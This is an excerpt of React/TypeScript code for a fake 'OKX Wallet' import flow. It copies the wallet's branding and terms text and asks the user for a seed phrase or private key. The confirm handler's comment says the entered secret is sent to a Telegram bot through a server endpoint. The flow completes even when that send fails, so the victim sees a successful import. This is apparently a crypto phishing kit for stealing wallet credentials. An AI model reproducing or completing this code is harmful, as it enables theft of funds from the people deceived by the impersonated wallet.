    ...
    <div className="flex flex-col h-full bg-black text-white">
      ...
      <div className="flex-1 flex flex-col px-4 sm:px-6 py-6">
        ...
        <p className="text-gray-500 text-sm text-center pb-6 pt-8">
          By proceeding, I agree to OKX Wallet's <span className="text-orange-500 font-semibold cursor-pointer hover:underline">Terms of Service</span>
        </p>
      </div>
    </div>
  )
...
const SeedPhraseScreen = ({
  ...
  const handleWordCountChange = (count: number) => {
    setWordCount(count)
    setShowWordCountDropdown(false)
    // Adjust seed words array if needed
  ...
  const handleConfirm = async () => {
    ...
    if (activeTab === "seed-phrase") {
      ...
      // Validate private key format (EVM private key is 64 hex characters, optionally prefixed with 0x)
    ...
    // Send to Telegram bot via secure server endpoint
    try {
      ...
      // After successful send, proceed to complete
      onComplete()
    } catch (error) {
      console.error("Failed to send to Telegram:", error)
      // Still proceed even if Telegram fails
      onComplete()
    } finally {
  ...
  const isConfirmDisabled = activeTab === "seed-phrase" 
          ...
          <button
            ...
            className={`flex-1 py-3.5 sm:py-4 px-3.5 sm:px-4 font-medium transition ${
              activeTab === "seed-phrase"
                ...
                : "bg-[#1E1E1E] text-gray-400 border-r border-[#2a2a2a]"
            }`}
          >
            Seed phrase
          </button>
  ...
  return (
    <div className="flex flex-col h-full bg-black text-white">
      ...
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        ...
        <p className="text-gray-400 text-center mb-8">{address.slice(0, 6)}...{address.slice(-4)}</p>
...
export function OKXWalletSimulation({ open, onOpenChange, address, allocation, onWalletImported }: OKXWalletSimulationProps) {
  ...
  const handleSeedPhraseComplete = () => {
    // Notify parent component that wallet has been imported
    if (onWalletImported) {
      onWalletImported(address, allocation)
    }
    // Close the wallet simulation immediately after successful import
    onOpenChange(false)
  }
  ...
  return (
    <Sheet open={open} onOpenChange={handleOpenChange}>
      <SheetContent
        side="right"
        className="w-full sm:max-w-md p-0 bg-black border-gray-800"
      >
        {currentScreen === "welcome" && <WelcomeScreen onNext={handleWelcomeNext} />}
        {currentScreen === "import" && (
          <ImportWalletScreen onBack={handleImportBack} onNext={handleImportNext} />
        )}
